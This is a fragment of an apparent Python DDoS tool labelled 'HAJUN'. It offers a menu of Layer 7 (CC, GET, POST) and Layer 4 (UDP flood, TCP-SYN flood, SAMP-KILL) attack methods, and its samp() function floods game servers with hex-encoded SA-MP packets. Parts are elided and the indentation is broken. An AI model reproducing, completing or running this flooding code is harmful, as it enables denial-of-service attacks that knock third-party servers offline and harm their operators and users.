import struct, codecs, sys, threading, random, time, os
import requests
import socket
import socks
import time
...
def samp(ip, port, dur):
    Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"), codecs.decode("53414d509538e1a9611e63","hex_codec"), codecs.decode("53414d509538e1a9611e69","hex_codec"), codecs.decode("58414c4241444f52202d2d3e2041545441434b202d2d3e204f5648202d2d3e20444f574e","hex_codec"), codecs.decode("5448454a4159202d2d3e2041545441434b202d2d3e205544502053414d50202d2d3e20444f574e","hex_codec"), codecs.decode("44444f532041545441434b202d3e2042592058414c4241444f52202d3e2053454e44","hex_codec"), codecs.decode("544845204a4159202d3e2041545441434b202d3e20534552564552","hex_codec"), codecs.decode("5448454a415920582058414c4241444f52202d3e2041545441434b202d3e204558504c4f4954202d3e20534552564552202d3e20554450","hex_codec"), codecs.decode("53414d509538e1a9611e72","hex_codec"), codecs.decode("3830302c37372c363631","hex_codec"), codecs.decode("35312c31352c363636","hex_codec"), codecs.decode("37312c31382c313737","hex_codec"), codecs.decode("081e62da","hex_codec"), codecs.decode("081e77da","hex_codec"), codecs.decode("081e4dda","hex_codec"), codecs.decode("021efd40","hex_codec"), codecs.decode("021efd40","hex_codec"), codecs.decode("35342c38302c3232","hex_codec"), codecs.decode("081e7eda","hex_codec")]
    randport=(True,False)[port==0]
    clock=(lambda:0,time.time)[dur>0]
    duration=(1,(clock()+dur))[dur>0]
    print('[HAJUN] Attack %s:%s For %s Seconds'%(ip,port,dur or 'infinite'))
...
def method():
  print("""
[+]════[ Layer 7 ]═════[+]═══════[ Layer 4 ]══════[+]
 ║ 0: CC        [ DDos ] ║ 3: UDP Flood     [ Home ] ║
 ║ 1: GET       [ DDoS ] ║ 4: TCP-SYN Flood [ DDos ] ║ 
 ║ 2: POST      [ DDoS ] ║ 5: SAMP-KILL     [ DDos ] ║
[+]════════════════════════════════════════════[+]
""")
	...
	for n,args in enumerate(sys.argv):
		...
		if args =="-v":
			...
			if proxy_ver == "4":
				...
				return
    if args == "-samp":
      threading.Thread(target=samp, args=(ip, port, dur)).start()
		if args == "-b":
			if sys.argv[n+1] == "1":
				brute = True
			elif sys.argv[n+1] == "0":
